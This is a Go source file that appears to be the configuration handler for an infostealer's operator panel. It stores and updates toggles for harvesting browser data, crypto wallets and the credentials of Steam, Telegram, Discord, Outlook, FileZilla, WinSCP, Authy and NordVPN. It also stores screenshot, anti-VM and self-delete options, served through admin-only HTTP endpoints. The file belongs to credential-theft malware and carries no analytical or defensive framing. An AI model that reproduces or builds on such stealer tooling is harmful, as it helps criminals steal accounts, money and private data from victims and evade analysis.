package config

import (
	"net/http"

	database "../../db"
	lggr "../../logger"
	login "../login"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()
var logger = lggr.Log()

type ConfigData struct {
	Chromium      bool `db:"Chromium" json:"chromium"`
	Gecko         bool `db:"Gecko" json:"gecko"`
	Edge          bool `db:"Edge" json:"edge"`
	History       bool `db:"History" json:"history"`
	SysInfo       bool `db:"SysInfo" json:"sys_info"`
	Screenshot    bool `db:"Screenshot" json:"screenshot"`
	CryptoWallets bool `db:"CryptoWallets" json:"crypto_wallets"`
	Steam         bool `db:"Steam" json:"steam"`
	Telegram      bool `db:"Telegram" json:"telegram"`
	Discord       bool `db:"Discord" json:"discord"`
	Jabber        bool `db:"Jabber" json:"jabber"`
	Foxmail       bool `db:"Foxmail" json:"foxmail"`
	Outlook       bool `db:"Outlook" json:"outlook"`
	FileZilla     bool `db:"FileZilla" json:"file_zilla"`
	WinScp        bool `db:"WinScp" json:"win_scp"`
	Authy         bool `db:"Authy" json:"authy"`
	NordVpn       bool `db:"NordVpn" json:"nord_vpn"`
	MaxFilesSize  int  `db:"MaxFilesSize" json:"max_files_size"`
	AntiVm        bool `db:"AntiVm" json:"Anti_vm"`
	SelfDelete    bool `db:"SelfDelete" json:"self_delete"`
}

func GetConfig() (configData ConfigData) {
	err := db.Get(&configData, "SELECT `Chromium`, `Gecko`, `Edge`, `History`, `SysInfo`, `Screenshot`, `CryptoWallets`, `Steam`, `Telegram`, `Discord`, `Jabber`, `Foxmail`, `Outlook`, `FileZilla`, `WinScp`, `Authy`, `NordVpn`, `MaxFilesSize`, `AntiVm`, `SelfDelete` FROM `config`")
	if err != nil {
		logger.Println("config.GetConfig: get config data from db error: ", err)
	}

	return configData
}

func Get(ctx *gin.Context) {
	if !login.CtxRootAuthCheck(ctx) {
		logger.Println("config.Get: unauthorized user: ", ctx.ClientIP())
		return
	}

	ctx.JSON(http.StatusOK, GetConfig())
}

type UpdateConfigData struct {
	Cookie string     `json:"cookie"`
	Config ConfigData `json:"config"`
}

func Update(ctx *gin.Context) {
	var config UpdateConfigData
	ctx.BindJSON(&config)

	if !login.RootAuthCheck(config.Cookie) {
		logger.Println("config.Update: unauthorized user: ", ctx.ClientIP())
		return
	}

	_, err := db.Exec("UPDATE `config` SET `Chromium` = ?, `Gecko` = ?, `Edge` = ?, `History` = ?, `SysInfo` = ?, `Screenshot` = ?, `CryptoWallets` = ?, `Steam` = ?, `Telegram` = ?, `Discord` = ?, `Jabber` = ?, `Foxmail` = ?, `Outlook` = ?, `FileZilla` = ?, `WinScp` = ?, `Authy` = ?, `NordVpn` = ?, `MaxFilesSize` = ?, `AntiVm` = ?, `SelfDelete` = ?",
		config.Config.Chromium,
		config.Config.Gecko,
		config.Config.Edge,
		config.Config.History,
		config.Config.SysInfo,
		config.Config.Screenshot,
		config.Config.CryptoWallets,
		config.Config.Steam,
		config.Config.Telegram,
		config.Config.Discord,
		config.Config.Jabber,
		config.Config.Foxmail,
		config.Config.Outlook,
		config.Config.FileZilla,
		config.Config.WinScp,
		config.Config.Authy,
		config.Config.NordVpn,
		config.Config.MaxFilesSize,
		config.Config.AntiVm,
		config.Config.SelfDelete,
	)
	if err != nil {
		logger.Println("config.UpdateConfig: update config data error: ", err)
	}

	statusErr := ""
	if err != nil {
		statusErr = err.Error()
	}

	ctx.JSON(http.StatusOK, gin.H{"err": statusErr})
}
